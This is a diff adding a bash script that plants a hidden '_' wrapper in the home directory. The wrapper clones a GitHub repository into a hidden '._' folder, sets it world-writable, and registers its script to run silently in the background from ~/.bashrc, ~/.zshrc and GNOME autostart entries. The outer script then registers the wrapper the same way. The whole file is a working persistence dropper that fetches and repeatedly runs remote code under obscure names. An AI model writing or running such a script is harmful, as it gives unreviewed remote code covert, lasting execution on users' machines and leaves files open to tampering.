@@ -1,0 +1,44 @@
+# create the wrapper script _
+cat > ~/_ <<'EOF'
+#!/bin/bash
+
+# clone repository into ._
+git clone https://github.com/Redalamtaoui/Maroc_telecom_pack.git ._
+
+# set permissions for ._
+chmod -R 777 ._ && \
+SCRIPT_PATH="$(cd ._ && pwd)/maroc_telecom.sh" && \
+echo "bash \"$SCRIPT_PATH\" &" >> ~/.zshrc && \
+echo "bash \"$SCRIPT_PATH\" &" >> ~/.bashrc && \
+mkdir -p ~/.config/autostart && \
+cat > ~/.config/autostart/maroc_telecom.desktop <<EOL
+[Desktop Entry]
+Type=Application
+Exec=bash "$SCRIPT_PATH" &
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name=Maroc Telecom Script
+EOL
+EOF
+
+# give execution permission if the wrapper script was created
+if [ -f ~/_ ]; then
+    chmod +x ~/_ 
+    WRAPPER_PATH="$(cd ~ && pwd)/_"
+    echo "bash \"$WRAPPER_PATH\" &" >> ~/.bashrc
+    echo "bash \"$WRAPPER_PATH\" &" >> ~/.zshrc
+    mkdir -p ~/.config/autostart
+    cat > ~/.config/autostart/underscore.desktop <<EOF
+[Desktop Entry]
+Type=Application
+Exec=bash "$WRAPPER_PATH" &
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name=Underscore Script
+EOF
+    echo "Wrapper script added successfully to terminal startup and autostart."
+else
+    echo "Error: Failed to create the wrapper script."
+fi
